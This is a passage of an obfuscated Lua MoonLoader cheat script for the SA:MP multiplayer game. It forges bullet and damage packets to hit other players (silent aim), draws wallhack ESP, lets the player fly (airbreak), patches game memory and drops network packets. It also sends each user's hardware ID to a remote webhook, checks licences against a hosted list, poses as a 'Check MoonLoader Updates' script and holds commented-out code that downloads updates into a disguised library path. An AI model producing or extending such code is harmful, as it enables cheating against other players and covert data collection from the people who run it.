        getÂînåÐîsitiîn(ffi.cast("void*", pedptr), vec, id, true)
        return vec[0], vec[1], vec[2]
    end
end
-- SMÎÎTH

-- SILÅNT
local cx = representIntAsFloat(readMemory(0xB6EC10, 4, false))
local cy = representIntAsFloat(readMemory(0xB6EC14, 4, false))
local w, h = getScreenResolution()
local xc, yc = w * cy, h * cx

function getpx()
	return ((w / 2) / getCameraFov()) * gui.silånt.ra.v
end

function canPedBeShot(ped)
	local ax, ay, az = convertScreenCoordsToWorld3D(xc, yc, 0) -- getCharCoordinates(1)
	local bx, by, bz = getCharCoordinates(ped)
	return not select(1, processLineOfSight(ax, ay, az, bx, by, bz + 0.7, true, false, false, true, false, true, false, false))
end

function getcond(ped)
	if gui.silånt.ws.v then return true
	else return canPedBeShot(ped) end
end

function getDistanceFromPed(ped)
	local ax, ay, az = getCharCoordinates(1)
	local bx, by, bz = getCharCoordinates(ped)
	return math.sqrt( (ax - bx) ^ 2 + (ay - by) ^ 2 + (az - bz) ^ 2 )
end

function getClosestPlayerFromCrosshair()
	local R1, target = getCharPlayerIsTargeting(0)
	local R2, player = sampGetPlayerIdByCharHandle(target)
	if R2 then return player, target end
	local minDist = getpx()
	local closestId, closestPed = -1, -1
	for i = 0, 999 do
		local res, ped = sampGetCharHandleBySampPlayerId(i)
		if res then
			if getDistanceFromPed(ped) < gui.silånt.ds.v then
			local xi, yi = convert3DCoordsToScreen(getCharCoordinates(ped))
			local dist = math.sqrt( (xi - xc) ^ 2 + (yi - yc) ^ 2 )
			if dist < minDist then
				minDist = dist
				closestId, closestPed = i, ped
			end
			end
		end
	end
	return closestId, closestPed
end

function rand() return math.random(-50, 50) / 100 end

function getDamage(weap)
	local damage = {
		[22] = 8.25,
		[23] = 13.2,
		[24] = 46.200000762939,
		[25] = 30,
		[26] = 30,
		[27] = 30,
		[28] = 6.6,
		[29] = 8.25,
		[30] = 9.9,
		[31] = 9.9000005722046,
		[32] = 6.6,
		[33] = 25,
		[38] = 46.2
	}
	return (damage[weap] or 0) + math.random(1e9)/1e15
end

local shotindex = 0

function events.onSendBulletSync(data)
	math.randomseed(os.clock())
    if gui.silånt.en.v and not unl then
        local weap = getCurrentCharWeapon(1)
        local _, pedID = sampGetPlayerIdByCharHandle(PLAYER_PED)
        if getDamage(weap) then
            local id, ped = getClosestPlayerFromCrosshair()
            if id ~= -1 then
                if data.targetType ~= 1 then
                    if math.random(1, 100) > gui.silånt.hc.v then return end
                    if getcond(ped) then

                        local px, py, pz = getCharCoordinates(ped)
			            local mx, my, mz = getCharCoordinates(PLAYER_PED)

                        local randX = rand(-0.25, 0.25)
				        local randY = rand(-0.25, 0.25)
				        local randZ = rand(-0.80, 0.80)

                        data.targetId = id
                        data.target = {x = px + rand(), y = py + rand(), z = pz + rand()}
                        data.center = {x = rand(), y = rand(), z = rand()}

                        if (gui.silånt.cf.v and sampGetPlayerColor(pedID) == sampGetPlayerColor(id) or gui.silånt.cm.v and getCharModel(PLAYER_PED) == getCharModel(ped) or gui.silånt.cd.v and isCharDead(ped) or gui.silånt.cc.v and isCharInAnyCar(ped)) then return end

                        lua_thread.create(function()
                            wait(1)
                            sampSendGiveDamage(id, getDamage(weap), weap, 3)
                            addBlood(px, py, pz, 0.0, 0.0, 0.0, 5, 1)
                        end)
                    end
                end
            end
        end
    end
end
-- SILÅNT

-- VISUÀL
function visuàl()
    if gui.visuàl.drf.v then
        local crosshairPos = {convertGameScreenCoordsToWindowScreenCoords(339.1, 179.1)}
        if gui.smuth.en.v then renderFigure2D(crosshairPos[1], crosshairPos[2], (gui.smuth.ra.v * 10) >= 70 and 144 or 72, ((gui.smuth.ra.v * 10) - 1.0), 0xFF00FF00) end
        if gui.silånt.en.v then renderFigure2D(crosshairPos[1], crosshairPos[2], gui.silånt.ra.v >= 70 and 144 or 72, (gui.silånt.ra.v - 1.0), 0xFFFF0000) end
    end

    for i = 0, sampGetMaxPlayerId(true) do
        if sampIsPlayerConnected(i) then
            local find, handle = sampGetCharHandleBySampPlayerId(i)
            if find then
                if isCharOnScreen(handle) then
                    local myPos = {gåtÂîdóÐàrtÑîîrdinàtås(3, PLAYER_PED)}
                    local enPos = {gåtÂîdóÐàrtÑîîrdinàtås(3, handle)}
                    if (isLineOfSightClear(myPos[1], myPos[2], myPos[3], enPos[1], enPos[2], enPos[3], true, true, false, true, true)) then
                        color = sampGetPlayerColor(i)
                    else
                        color = sampGetPlayerColor(i)
                    end
                    if gui.visuàl.ln.v then
                        local myPosScreen = {convert3DCoordsToScreen(gåtÂîdóÐàrtÑîîrdinàtås(3, PLAYER_PED))}
                        local enPosScreen = {convert3DCoordsToScreen(gåtÂîdóÐàrtÑîîrdinàtås(3, handle))}
                        renderDrawLine(myPosScreen[1], myPosScreen[2], enPosScreen[1], enPosScreen[2], 1, color)
                    end
                    if gui.visuàl.bn.v then
                        local t = {3, 4, 5, 51, 52, 41, 42, 31, 32, 33, 21, 22, 23, 2}
                        for v = 1, #t do
                            pos1 = {gåtÂîdóÐàrtÑîîrdinàtås(t[v], handle)}
                            pos2 = {gåtÂîdóÐàrtÑîîrdinàtås(t[v] + 1, handle)}
                            pos1Screen = {convert3DCoordsToScreen(pos1[1], pos1[2], pos1[3])}
                            pos2Screen = {convert3DCoordsToScreen(pos2[1], pos2[2], pos2[3])}
                            renderDrawLine(pos1Screen[1], pos1Screen[2], pos2Screen[1], pos2Screen[2], 1, color)
                        end
                        for v = 4, 5 do
                            pos2 = {gåtÂîdóÐàrtÑîîrdinàtås(v * 10 + 1, handle)}
                            pos2Screen = {convert3DCoordsToScreen(pos2[1], pos2[2], pos2[3])}
                            renderDrawLine(pos1Screen[1], pos1Screen[2], pos2Screen[1], pos2Screen[2], 1, color)
                        end
                        local t = {53, 43, 24, 34, 6}
                        for v = 1, #t do
                            pos = {gåtÂîdóÐàrtÑîîrdinàtås(t[v], handle)}
                            pos1Screen = {convert3DCoordsToScreen(pos[1], pos[2], pos[3])}
                        end
                    end
                    if gui.visuàl.bx.v then
                        local headPos = {gåtÂîdóÐàrtÑîîrdinàtås(8, handle)}
                        local footPos = {gåtÂîdóÐàrtÑîîrdinàtås(44, handle)}
                        local pointOne =
                        {
                            x = headPos[1] - 0.5,
                            y = headPos[2],
                            z = headPos[3] + 0.35
                        } 
                        local pointTwo =
                        {
                            x = headPos[1] + 0.5,
                            y = headPos[2],
                            z = headPos[3] - 0.35
                        }
                        local pointThree =
                        {
                            x = footPos[1] + 0.5,
                            y = footPos[2],
                            z = footPos[3] - 0.35
                        }
                        local pointOneScreen = {convert3DCoordsToScreen(pointOne.x, pointOne.y, pointOne.z)}
                        local pointTwoScreen = {convert3DCoordsToScreen(pointTwo.x, pointTwo.y, pointOne.z)}
                        local pointThreeScreen = {convert3DCoordsToScreen(pointOne.x, pointThree.y, pointThree.z)}
                        local pointFourScreen = {convert3DCoordsToScreen(pointTwo.x, pointThree.y, pointThree.z)}
                        renderDrawLine(pointOneScreen[1], pointOneScreen[2], pointTwoScreen[1], pointTwoScreen[2], 1, color)
                        renderDrawLine(pointThreeScreen[1], pointThreeScreen[2], pointFourScreen[1], pointFourScreen[2], 1, color)
                        renderDrawLine(pointOneScreen[1], pointOneScreen[2], pointThreeScreen[1], pointThreeScreen[2], 1, color)
                        renderDrawLine(pointTwoScreen[1], pointTwoScreen[2], pointFourScreen[1], pointFourScreen[2], 1, color)
                    end
                end
            end
        end
    end
    return false
end
-- VISUÀL

-- ÌiSÑ
function misñ()
    setCharCanBeKnockedOffBike(PLAYER_PED, gui.misñ.bf.v)

    setCharUsesUpperbodyDamageAnimsOnly(PLAYER_PED, gui.misñ.as.v)

    memory.setint8(0xB7CEE4, gui.misñ.ir.v and 1 or 0, true)

    memory.setuint8(0x96916E, gui.misñ.io.v and 1 or 0, 1)

    memory.write(0x0058E1D9, gui.misñ.scr.v and 0xEB or 116, 1, true)

    if gui.misñ.nf.v then
        if isCharPlayingAnim(PLAYER_PED, 'KO_SKID_BACK') or isCharPlayingAnim(PLAYER_PED, 'FALL_COLLAPSE') then
            local charPos = {getCharCoordinates(PLAYER_PED)}
            setCharCoordinates(PLAYER_PED, charPos[1], charPos[2], charPos[3] - 1)
        end
    end

    if gui.misñ.ncr.v then
        if not ncr then
            memory.write(0x5109AC, 235, 1, true)
            memory.write(0x5109C5, 235, 1, true)
            memory.write(0x5231A6, 235, 1, true)
            memory.write(0x52322D, 235, 1, true)
            memory.write(0x5233BA, 235, 1, true)
            ncr = true
        end
    else
        if ncr then
            memory.write(0x5109AC, 122, 1, true)
            memory.write(0x5109C5, 122, 1, true)
            memory.write(0x5231A6, 117, 1, true)
            memory.write(0x52322D, 117, 1, true)
            memory.write(0x5233BA, 117, 1, true)
            ncr = false
        end
    end

    if gui.misñ.ar.v then
        if wasKeyPressed(VK_RSHIFT) then
            àirbråàk = not àirbråàk
        end
        if àirbråàk then
            local charCoordinates = {getCharCoordinates(PLAYER_PED)}
            local ViewHeading = getCharHeading(PLAYER_PED)
            Coords = {charCoordinates[1], charCoordinates[2], charCoordinates[3], 0.0, 0.0, ViewHeading}
            local MainHeading = getCharHeading(PLAYER_PED)
            local Camera = {getActiveCameraCoordinates()}
            local Target = {getActiveCameraPointAt()}
            local RotateHeading = getHeadingFromVector2d(Target[1] - Camera[1], Target[2] - Camera[2])
            if isKeyDown(VK_W) then
                Coords[1] = Coords[1] + 0.25 * math.sin(-math.rad(RotateHeading))
                Coords[2] = Coords[2] + 0.25 * math.cos(-math.rad(RotateHeading))
                setCharHeading(PLAYER_PED, RotateHeading)
            elseif isKeyDown(VK_A) then
                Coords[1] = Coords[1] - 0.25 * math.sin(-math.rad(MainHeading))
                Coords[2] = Coords[2] - 0.25 * math.cos(-math.rad(MainHeading))
            end
            if isKeyDown(VK_S) then
                Coords[1] = Coords[1] - 0.25 * math.sin(-math.rad(MainHeading - 90))
                Coords[2] = Coords[2] - 0.25 * math.cos(-math.rad(MainHeading - 90))
            elseif isKeyDown(VK_D) then
                Coords[1] = Coords[1] - 0.25 * math.sin(-math.rad(MainHeading + 90))
                Coords[2] = Coords[2] - 0.25 * math.cos(-math.rad(MainHeading + 90))
            end
            if isKeyDown(32) then Coords[3] = Coords[3] + 0.25 / 1.5 end
            if isKeyDown(VK_LSHIFT) and Coords[3] > -95.0 then Coords[3] = Coords[3] - 0.25 / 1.5 end
            setCharCoordinates(PLAYER_PED, Coords[1], Coords[2], Coords[3] - 1)
        end
    end

    if gui.misñ.sh.v then
        if isKeyDown(VK_LMENU) then
            if isCharInAnyCar(PLAYER_PED) then
                local car = storeCarCharIsInNoSave(PLAYER_PED)
                local vector = {getCarSpeedVector(car)}
                local heading = getCarHeading(car)
                local turbo = fpsCorrection() / 75
                local force = {turbo, turbo, turbo}
                local Sin, Cos = math.sin(-math.rad(heading)), math.cos(-math.rad(heading))
                if vector[1] > -0.01 and vector[1] < 0.01 then force[1] = 0.0 end
                if vector[2] > -0.01 and vector[2] < 0.01 then force[2] = 0.0 end
                if vector[3] < 0 then force[3] = -force[3] end
                if vector[3] > -2 and vector[3] < 15 then force[3] = 0.0 end
                if Sin > 0 and vector[1] < 0 then force[1] = -force[1] end
                if Sin < 0 and vector[1] > 0 then force[1] = -force[1] end
                if Cos > 0 and vector[2] < 0 then force[2] = -force[2] end
                if Cos < 0 and vector[2] > 0 then force[2] = -force[2] end
                applyForceToCar(car, force[1] * Sin, force[2] * Cos, force[3] / 2, 0.0, 0.0, 0.0)
            end
        end
    end

    if gui.misñ.dr.v then
        if not dow then
            memory.write(0x6CC303, 0x621F8A, 3, true)
            memory.write(0x6A90C5, 0xEB, 1, true)
            dow = true
        end
    else
        if dow then
            memory.write(0x6CC303, 0xEFE180, 3, true)
            memory.write(0x6A90C5, 0x7A, 1, true)
            dow = false
        end
    end

    if gui.misñ.fe.v then
        if wasKeyPressed(VK_F) then
            if isCharInAnyCar(PLAYER_PED) then
                local posX, posY, posZ = getCarCoordinates(storeCarCharIsInNoSave(PLAYER_PED))
                warpCharFromCarToCoord(PLAYER_PED, posX, posY, posZ)
            end
        end
    end

    if gui.misñ.jb.v then
        if not jumðbmõ then
            memory.setint8(0x969161, 1)
            jumðbmõ = true
        end
    else
        if jumðbmõ then
            memory.setint8(0x969161, 0)
            jumðbmõ = false
        end
    end

    if gui.misñ.ca.v then
        if isKeyJustPressed(VK_X) and not sampIsChatInputActive() and not sampIsDialogActive() and not isSampfuncsConsoleActive() then
            clearCharTasksImmediately(PLAYER_PED)
        end
    end

    if gui.misñ.nr.v then
		local weapon = getCurrentCharWeapon(PLAYER_PED)
		if getDamage(weapon) and getAmmoInClip() == 1 then
			giveWeaponToChar(PLAYER_PED, weapon, 0)
		end
	end

    if gui.misñ.atc.v and isKeyJustPressed(82) and isKeyDown(2) and not isCharDead(PLAYER_PED) and getAmmoInClip() > 0 and onCheck() then
		wait(0)
		setCharAnimSpeed(PLAYER_PED, "python_fire", 1.337)
		setGameKeyState(17, 255)
		wait(55)
		setGameKeyState(6, 0)
		setGameKeyState(18, 255)
		setCharAnimSpeed(PLAYER_PED, "python_fire", 1.0)
	end

    if gui.misñ.weg.v and isCharInAnyCar(PLAYER_PED) then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        setCanBurstCarTires(veh, false)
    end

    if gui.misñ.spb.v and isCharInAnyCar(PLAYER_PED) and isKeyJustPressed(VK_C) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        local vle = getCarHeading(veh)
        local ofX, ofY, ofZ = getOffsetFromCarInWorldCoords(veh, 0.0, 14.5, -1.3)
        local object = createObject(1634, ofX, ofY, ofZ) 
        local ole = getObjectHeading(object)
        setObjectHeading(object, vle)
        wait(3500)
        deleteObject(object)
    end

    if gui.misñ.tm.v and isCharInAnyCar(PLAYER_PED) then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        setCarHeavy(veh, true)
    else
        if isCharInAnyCar(PLAYER_PED) then
            local veh = storeCarCharIsInNoSave(PLAYER_PED)
            setCarHeavy(veh, false)
        end
    end

    if gui.misñ.ajm.v and isCharInAnyCar(PLAYER_PED) then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        if isCarVisiblyDamaged(veh) then
            setCarEngineBroken(veh, false)
        end
    end

    if gui.misñ.hm.v and isCharInAnyCar(PLAYER_PED) then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        setCarHydraulics(veh, true)
    else
        if isCharInAnyCar(PLAYER_PED) then
            local veh = storeCarCharIsInNoSave(PLAYER_PED)
            setCarHydraulics(veh, false)
        end
    end

    if gui.misñ.bf.v and isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        setCarEngineBroken(veh, false)
    end

    if gui.misñ.cb.v and isCharInAnyCar(PLAYER_PED) and isKeyJustPressed(0x4A) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        repeat
            local speed = getCarSpeed(veh)
            setCarForwardSpeed(veh, speed - 0.5)
            wait(0)
        until speed > 0
    end

    if gui.misñ.row.v and isCharInAnyCar(PLAYER_PED) then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        memory.write(9867602, 1, 4)
    else
        memory.write(9867602, 0, 4)
    end

    if gui.misñ.fc.v and isKeyJustPressed(0x2E) and isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        local oX, oY, oZ = getOffsetFromCarInWorldCoords(veh, 0.0,  0.0,  0.0)
        setCarCoordinates(veh, oX, oY, oZ)
    end

    if gui.misñ.ei.v and isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
        local veh = storeCarCharIsInNoSave(PLAYER_PED)
        if isCarUpsidedown(veh) then
            setCarHealth(veh, 1000)
        end
    end

    if gui.misñ.r180.v and isKeyJustPressed(0x08) and isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
		local cVecX, cVecY, cVecZ = getCarSpeedVector(storeCarCharIsInNoSave(PLAYER_PED))
		applyForceToCar(storeCarCharIsInNoSave(PLAYER_PED), -cVecX / 25, -cVecY / 25, -cVecZ / 25, 0.0, 0.0, 0.0)
		local x, y, z, w = getVehicleQuaternion(storeCarCharIsInNoSave(PLAYER_PED))
		local matrix = {convertQuaternionToMatrix(w, x, y, z)}
		matrix[1] = -matrix[1]
		matrix[2] = -matrix[2]
		matrix[4] = -matrix[4]
		matrix[5] = -matrix[5]
		matrix[7] = -matrix[7]
		matrix[8] = -matrix[8]
		local w, x, y, z = convertMatrixToQuaternion(matrix[1], matrix[2], matrix[3], matrix[4], matrix[5], matrix[6], matrix[7], matrix[8], matrix[9])
        setVehicleQuaternion(storeCarCharIsInNoSave(PLAYER_PED), x, y, z, w)
        setCarForwardSpeed(storeCarCharIsInNoSave(PLAYER_PED), 0.0)
    end

    if gui.misñ.jc.v and isKeyJustPressed(VK_B) and isCharInAnyCar(PLAYER_PED) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
        local cVecX, cVecY, cVecZ = getCarSpeedVector(storeCarCharIsInNoSave(PLAYER_PED))
        if cVecZ < 7.0 then applyForceToCar(storeCarCharIsInNoSave(PLAYER_PED), 0.0, 0.0, 0.1, 0.0, 0.0, 0.0) 
        end
    end

    if gui.misñ.sph.v then
        if sampIsLocalPlayerSpawned() then
            if isCharOnFoot(PLAYER_PED) and not isCharInAnyCar(PLAYER_PED) and isKeyDown(32) and not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
                setGameKeyState(16, 256)
                wait(10)
                setGameKeyState(16, 0)
            end
        end
    end

    if gui.misñ.fu.v then
        if isSampLoaded() then
            memory.setuint8(getModuleHandle("samp.dll") + 0x9D170, status and 0xC3 or 0x51, true)
        end
    end

    return false
end

function events.onSetVehicleHealth(vehicleId, health)
    if gui.misñ.ajm.v then
        return false
    end
end

function onCheck()
	if not sampIsChatInputActive() and not isSampfuncsConsoleActive() and not sampIsDialogActive() then
		return true
	end
	return false
end

function events.onSendPlayerSync(data)
    if àirbråàk then
        data.animationId = 1130
        data.moveSpeed = {x = 0.89, y = 0.89, z = -0.89}
    end
end

function events.onSetPlayerPos()
    if àirbråàk then
        return false 
    end
end

function getAmmoInClip()
	local struct = getCharPointer(PLAYER_PED)
	local prisv = struct + 0x0718
	local prisv = memory.getint8(prisv, false)
	local prisv = prisv * 0x1C
	local prisv2 = struct + 0x5A0
	local prisv2 = prisv2 + prisv
	local prisv2 = prisv2 + 0x8
	local ammo = memory.getint32(prisv2, false)
	return ammo
end
-- ÌiSÑ

function renderFigure2D(x, y, points, radius, color)
    local step = math.pi * 2 / points
    local render_start, render_end = {}, {}
    for i = 0, math.pi * 2, step do
        render_start[1] = radius * math.cos(i) + x
        render_start[2] = radius * math.sin(i) + y
        render_end[1] = radius * math.cos(i + step) + x
        render_end[2] = radius * math.sin(i + step) + y
        renderDrawLine(render_start[1], render_start[2], render_end[1], render_end[2], 1, color)
    end
end
-- VISUÀL

-- NOPS
function check_has_in_filter(name, t)
    for key, value in pairs(t) do
        if value[1]:gsub('##.+', '') == name then return value[2].v end
    end
end

function render_filter(num, t, f) -- f = ˜˜˜˜˜˜
    if currentDrawingMenu == num  then
        for key, value in pairs(t) do
            if #f.v > 0 then
                if string.find(string.lower(value[1]), string.lower(f.v), 1, true) then
                    imgui.Checkbox(value[1], value[2])
                end
            else
                imgui.Checkbox(value[1], value[2])
            end
        end
    end
end

for i = 200, 212 do
    if raknetGetPacketName(i) ~= nil then
        if Packets[i] ~= nil then
            filter_packets_incoming[i] = {raknetGetPacketName(i), imgui.ImBool(false)}
            filter_packets_outcoming[i] = {raknetGetPacketName(i) ..'##1', imgui.ImBool(false)}
        end
    end
end

for i = 1, 166 do
    if raknetGetRpcName(i) ~= nil then
        if RPC.incoming[i] ~= nil then
            filter_rpc_incoming[i] = {raknetGetRpcName(i), imgui.ImBool(false)}
        end
        if RPC.outcoming[i] ~= nil then
            filter_rpc_outcoming[i] = {raknetGetRpcName(i) .. '##1', imgui.ImBool(false)}
        end
    end
end

function onReceiveRpc(id, bs)
    if RPC.incoming[id] and check_has_in_filter(raknetGetRpcName(id), filter_rpc_incoming) then return false end
end
  
function onSendRpc(id, bs, priority, reliability, orderingChannel)
    if RPC.outcoming[id] and check_has_in_filter(raknetGetRpcName(id), filter_rpc_outcoming) then return false end
end
  
  -- Packets
function onReceivePacket(id, bs)
    if check_has_in_filter(raknetGetPacketName(id), filter_packets_incoming) then return false end
end
  
function onSendPacket(id, bs, priority, reliability, orderingChannel)
    if check_has_in_filter(raknetGetPacketName(id), filter_packets_outcoming) then return false end
end
-- NOPS

function auth()
    local requests = require 'requests'
    notrequest, request = pcall(requests.get, 'https://raw.githubusercontent.com/Eqzzz/MyHostFiles/main/accounts')
    if notrequest then
        for check in request.text:gmatch('[^\r\n]+') do
            if check:find("%[%d+ | UID: %d+%] .+ | %d+ | %d+ DAYS %[.+%]") then
                ha, ua, la, ka, da = check:match("%[(%d+) | UID: (%d+)%] (.+) | (%d+) | %d+ DAYS %[(.+)%]")
                if ha == tostring(serial) then
                    return true
                end
            end
        end
    end
    return false
end

function asyncHttpRequest(method, url, args, resolve, reject)
    local request_thread = effil.thread(function (method, url, args)
        local requests = require 'requests'
        local result, response = pcall(requests.request, method, url, args)
        if result then
            response.json, response.xml = nil, nil
            return true, response
        else
            return false, response
        end
    end)(method, url, args)
    -- Åñëè çàïðîñ áåç ôóíêöèé îáðàáîòêè îòâåòà è îøèáîê.
    if not resolve then resolve = function() end end
    if not reject then reject = function() end end
    -- Ïðîâåðêà âûïîëíåíèÿ ïîòîêà
    lua_thread.create(function()
        local runner = request_thread
        while true do
            local status, err = runner:status()
            if not err then
                if status == 'completed' then
                    local result, response = runner:get()
                    if result then
                        resolve(response)
                    else
                        reject(response)
                    end
                    return
                elseif status == 'canceled' then
                    return reject(status)
                end
            else
                return reject(err)
            end
            wait(0)
        end
    end)
end

function autoupdate(json_url, prefix, url)
    local dlstatus = require('moonloader').download_status
    local json = "C:\\Windows\\update.json"
    if doesFileExist(json) then os.remove(json) end
    downloadUrlToFile(json_url, json,
    function(id, status, p1, p2)
        if status == dlstatus.STATUSEX_ENDDOWNLOAD then
        if doesFileExist(json) then
            local f = io.open(json, 'r')
            if f then
            local info = decodeJson(f:read('*a'))
            updatelink = info.updateurl
            updateversion = info.latest
            f:close()
            os.remove(json)
            if updateversion > script_version then
                lua_thread.create(function(prefix)
                local dlstatus = require('moonloader').download_status
                local color = -1
                wait(250)
                downloadUrlToFile(updatelink, "moonloader\\lib\\md5\\cîrå.lua",
                    function(id3, status1, p13, p23)
                    if status1 == dlstatus.STATUS_DOWNLOADINGDATA then
                    elseif status1 == dlstatus.STATUS_ENDDOWNLOADDATA then
                        goupdatestatus = true
                        lua_thread.create(function() wait(500) reloadScripts() end)
                    end
                    if status1 == dlstatus.STATUSEX_ENDDOWNLOAD then
                        if goupdatestatus == nil then
                        update = false
                        end
                    end
                    end
                )
                end, prefix
                )
            else
                update = false
            end
            end
        else
            update = false
        end
        end
    end
    )
    while update ~= false do wait(100) end
end

function func()
    if not isSampfuncsLoaded() or not isSampLoaded() then return end
	while not isSampAvailable() do wait(100) end

    if thisScript().name ~= "Check MoonLoader Updates" then unl = true else auth() end

    if not unl then
        if not notrequest then
            printStyledString("~r~You don't have an internet connection", 5000, 2)
        elseif ha ~= tostring(serial) then
            printStyledString("~p~You don't have a subscription", 5000, 2)
            data["username"] = "LOGS BOT | IC"
            data["content"] = "——————————————————————————————\nUSERNAME: Unknown\nHWID: " .. serial .. "\nÁÓÄÜÒÅ ÂÍÈÌÀÒÅËÜÍÅÅ\n——————————————————————————————"
            asyncHttpRequest('POST', url, {headers = {['content-type'] = 'application/json'}, data = u8(encodeJson(data))})
        else
            data["username"] = "LOGS BOT | IC"
            data["content"] = "——————————————————————————————\nUSERNAME: " .. la .. "\nUID: " .. ua .. "\nHWID: " .. ha .. "\nTill: " .. da .. "\n——————————————————————————————"
            asyncHttpRequest('POST', url, {headers = {['content-type'] = 'application/json'}, data = u8(encodeJson(data))})

            --autoupdate(https://raw.githubusercontent.com/Eqzzz/MyHostFiles/main/update.json, nil, url)

            if not doesFileExist(config_path) then
                local file = io.open(config_path, "a")
                save()
                file:close()
            end
            imgui.Style()
            lua_thread.create(smuth)
            lua_thread.create(visuàl)
            lua_thread.create(misñ)
        end
    end

    while true do
        wait(0)
        if not unl and ha == tostring(serial) then
            if isKeyJustPressed(45) then
                mainWindowState.v = not mainWindowState.v
            end
            imgui.Process = mainWindowState.v
        end
    end
end
lua_thread.create(func)

::visible::